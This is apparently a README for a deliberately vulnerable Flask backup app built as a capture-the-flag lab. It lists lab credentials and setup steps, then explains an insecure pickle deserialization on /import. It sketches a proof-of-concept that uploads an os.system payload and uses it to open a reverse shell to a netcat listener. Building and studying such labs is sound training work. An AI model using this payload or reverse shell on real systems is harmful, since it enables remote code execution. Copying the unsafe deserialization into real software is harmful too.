# Backup Management System – CTF Lab

## Folder Structure

```
backend/
├── app.py
├── requirements.txt
├── Dockerfile
├── docker-compose.yml
├── .env
├── templates/
│   ├── login.html
│   └── dashboard.html
└── utils/
    ├── __init__.py
    ├── auth.py
    └── session.py
```

## Credentials

| User  | Password          |
|-------|-------------------|
| admin | Adm1n@Backup2024! |
| guest | guest             |

## Run Instructions

### Option A – Docker Compose (recommended)

```bash
sudo docker compose up --build
```

App available at: http://localhost:9000

### Option B – Local

```bash
cd backend
pip install -r requirements.txt
# start redis locally first
redis-server &
python app.py
```

---

## Vulnerability

The `/import` endpoint passes user-controlled bytes directly to `pickle.loads()` after base64 decoding.

### Exploit PoC (Python)

`exp.py` exploits an insecure pickle deserialization vulnerability in Pallets Projects Flask backend to achieve remote code execution (RCE).

1) Create malicious pickle object

```
class Exploit:
    def __reduce__(self):
        return (os.system, (cmd,))


__reduce__() tells pickle what to execute during loading

returns (os.system, cmd)
```

so pickle.loads() → runs os.system(cmd)

2) Serialize + encode
```
pickle.dumps(Exploit(cmd))
base64.b64encode(...)
```

pickle → convert object into executable byte stream

base64 → match server’s expected format

👉 produces the payload file

3) Login
```
requests.Session().post("/login")
```

gets authenticated cookie

/import requires login

4) Upload payload
```
files={"session_file": ("evil.bak", payload)}

```

sends payload as file upload (multipart/form-data)

server reads it using:

```
request.files["session_file"].read()
```


5) Server vulnerability triggers

Server does:
```
pickle.loads(base64.b64decode(data))
```

Which becomes:
```
os.system(cmd)
```

👉 your command executes on the target

```
python exp.py --rev IP:PORT
```
IP -> local private LAN IP Address
PORT -> listener of port

Listener:

```nc -lnvp 4444```